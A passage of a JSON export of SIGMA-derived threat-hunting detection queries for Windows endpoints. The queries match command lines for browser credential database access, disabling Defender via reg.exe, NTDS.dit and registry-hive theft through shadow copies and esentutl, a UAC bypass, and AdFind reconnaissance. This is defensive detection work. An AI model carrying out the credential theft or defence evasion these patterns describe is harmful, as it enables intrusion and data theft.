                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 351
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1539",
                "t1555",
                "t1005"
            ],
            "name": "SQLite Chromium Profile Data DB Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName=\"SQLite\" or (tgt.process.image.path contains \"\\sqlite.exe\" or tgt.process.image.path contains \"\\sqlite3.exe\")) and (tgt.process.cmdline contains \"\\User Data\\\" or tgt.process.cmdline contains \"\\Opera Software\\\" or tgt.process.cmdline contains \"\\ChromiumViewer\\\") and (tgt.process.cmdline contains \"Login Data\" or tgt.process.cmdline contains \"Cookies\" or tgt.process.cmdline contains \"Web Data\" or tgt.process.cmdline contains \"History\" or tgt.process.cmdline contains \"Bookmarks\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 352
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - LogMeIn Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"LMIGuardianSvc\" or tgt.process.displayName=\"LMIGuardianSvc\" or tgt.process.publisher=\"LogMeIn, Inc.\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 353
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"reg.exe\" to disable security services such as Windows Defender.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Security Service Disabled Via Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\") and ((tgt.process.cmdline contains \"d 4\" and tgt.process.cmdline contains \"v Start\") and (tgt.process.cmdline contains \"\\AppIDSvc\" or tgt.process.cmdline contains \"\\MsMpSvc\" or tgt.process.cmdline contains \"\\NisSrv\" or tgt.process.cmdline contains \"\\SecurityHealthService\" or tgt.process.cmdline contains \"\\Sense\" or tgt.process.cmdline contains \"\\UsoSvc\" or tgt.process.cmdline contains \"\\WdBoot\" or tgt.process.cmdline contains \"\\WdFilter\" or tgt.process.cmdline contains \"\\WdNisDrv\" or tgt.process.cmdline contains \"\\WdNisSvc\" or tgt.process.cmdline contains \"\\WinDefend\" or tgt.process.cmdline contains \"\\wscsvc\" or tgt.process.cmdline contains \"\\wuauserv\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 354
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldn't have any child processes.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Spawned By Odbcconf.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\odbcconf.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 355
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Compress Data and Lock With Password for Exfiltration With WINZIP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"winzip.exe\" or tgt.process.cmdline contains \"winzip64.exe\") and tgt.process.cmdline contains \"-s\\\"\" and (tgt.process.cmdline contains \" -min \" or tgt.process.cmdline contains \" -a \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 356
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of schtasks with the delete flag and the asterisk symbol to delete all tasks from the schedule of the local computer, including tasks scheduled by other users.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1489"
            ],
            "name": "Delete All Scheduled Tasks",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /delete \" and tgt.process.cmdline contains \"/tn \\*\" and tgt.process.cmdline contains \" /f\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 357
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell script execution from Alternate Data Stream (ADS)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Run PowerShell Script from ADS",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Get-Content\" and tgt.process.cmdline contains \"-Stream\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 358
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid Image based detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use NTFS Short Name in Image",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"~1.bat\" or tgt.process.image.path contains \"~1.dll\" or tgt.process.image.path contains \"~1.exe\" or tgt.process.image.path contains \"~1.hta\" or tgt.process.image.path contains \"~1.js\" or tgt.process.image.path contains \"~1.msi\" or tgt.process.image.path contains \"~1.ps1\" or tgt.process.image.path contains \"~1.tmp\" or tgt.process.image.path contains \"~1.vbe\" or tgt.process.image.path contains \"~1.vbs\" or tgt.process.image.path contains \"~2.bat\" or tgt.process.image.path contains \"~2.dll\" or tgt.process.image.path contains \"~2.exe\" or tgt.process.image.path contains \"~2.hta\" or tgt.process.image.path contains \"~2.js\" or tgt.process.image.path contains \"~2.msi\" or tgt.process.image.path contains \"~2.ps1\" or tgt.process.image.path contains \"~2.tmp\" or tgt.process.image.path contains \"~2.vbe\" or tgt.process.image.path contains \"~2.vbs\") and (not src.process.image.path=\"C:\\Windows\\explorer.exe\") and (not (src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\" or tgt.process.image.path=\"C:\\PROGRA~1\\WinZip\\WZPREL~1.EXE\" or tgt.process.image.path contains \"\\VCREDI~1.EXE\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 359
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects AdFind execution with common flags seen used during attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1018",
                "t1087",
                "t1482",
                "t1069"
            ],
            "name": "PUA - AdFind Suspicious Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"domainlist\" or tgt.process.cmdline contains \"trustdmp\" or tgt.process.cmdline contains \"dcmodes\" or tgt.process.cmdline contains \"adinfo\" or tgt.process.cmdline contains \" dclist \" or tgt.process.cmdline contains \"computer_pwdnotreqd\" or tgt.process.cmdline contains \"objectcategory=\" or tgt.process.cmdline contains \"-subnets -f\" or tgt.process.cmdline contains \"name=\\\"Domain Admins\\\"\" or tgt.process.cmdline contains \"-sc u:\" or tgt.process.cmdline contains \"domainncs\" or tgt.process.cmdline contains \"dompol\" or tgt.process.cmdline contains \" oudmp \" or tgt.process.cmdline contains \"subnetdmp\" or tgt.process.cmdline contains \"gpodmp\" or tgt.process.cmdline contains \"fspdmp\" or tgt.process.cmdline contains \"users_noexpire\" or tgt.process.cmdline contains \"computers_active\" or tgt.process.cmdline contains \"computers_pwdnotreqd\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 360
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the \"IDiagnosticProfileUAC\" UAC bypass technique",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using IDiagnostic Profile",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\DllHost.exe\" and src.process.cmdline contains \" /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 361
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003"
            ],
            "name": "Esentutl Gather Credentials",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"esentutl\" and tgt.process.cmdline contains \" /p\")) | columns tgt.process.user,tgt.process.cmdline,src.process.cmdline,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 362
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566"
            ],
            "name": "Suspicious Double Extension File Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \".doc.exe\" or tgt.process.image.path contains \".docx.exe\" or tgt.process.image.path contains \".xls.exe\" or tgt.process.image.path contains \".xlsx.exe\" or tgt.process.image.path contains \".ppt.exe\" or tgt.process.image.path contains \".pptx.exe\" or tgt.process.image.path contains \".rtf.exe\" or tgt.process.image.path contains \".pdf.exe\" or tgt.process.image.path contains \".txt.exe\" or tgt.process.image.path contains \"      .exe\" or tgt.process.image.path contains \"______.exe\" or tgt.process.image.path contains \".doc.js\" or tgt.process.image.path contains \".docx.js\" or tgt.process.image.path contains \".xls.js\" or tgt.process.image.path contains \".xlsx.js\" or tgt.process.image.path contains \".ppt.js\" or tgt.process.image.path contains \".pptx.js\" or tgt.process.image.path contains \".rtf.js\" or tgt.process.image.path contains \".pdf.js\" or tgt.process.image.path contains \".txt.js\") and (tgt.process.cmdline contains \".doc.exe\" or tgt.process.cmdline contains \".docx.exe\" or tgt.process.cmdline contains \".xls.exe\" or tgt.process.cmdline contains \".xlsx.exe\" or tgt.process.cmdline contains \".ppt.exe\" or tgt.process.cmdline contains \".pptx.exe\" or tgt.process.cmdline contains \".rtf.exe\" or tgt.process.cmdline contains \".pdf.exe\" or tgt.process.cmdline contains \".txt.exe\" or tgt.process.cmdline contains \"      .exe\" or tgt.process.cmdline contains \"______.exe\" or tgt.process.cmdline contains \".doc.js\" or tgt.process.cmdline contains \".docx.js\" or tgt.process.cmdline contains \".xls.js\" or tgt.process.cmdline contains \".xlsx.js\" or tgt.process.cmdline contains \".ppt.js\" or tgt.process.cmdline contains \".pptx.js\" or tgt.process.cmdline contains \".rtf.js\" or tgt.process.cmdline contains \".pdf.js\" or tgt.process.cmdline contains \".txt.js\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 363
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1490"
            ],
            "name": "Sensitive File Access Via Volume Shadow Copy Backup",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\" and (tgt.process.cmdline contains \"\\NTDS.dit\" or tgt.process.cmdline contains \"\\SYSTEM\" or tgt.process.cmdline contains \"\\SECURITY\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 364
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of DeviceCredentialDeployment to hide a process from view",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "DeviceCredentialDeployment Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\DeviceCredentialDeployment.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 365
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1037"
            ],
            "name": "Potential Persistence Via Logon Scripts - CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"UserInitMprLogonScript\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 366
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of the \"Manage Engine ServiceDesk Plus\" Java web service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1102"
            ],
            "name": "Suspicious Child Process Of Manage Engine ServiceDesk",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
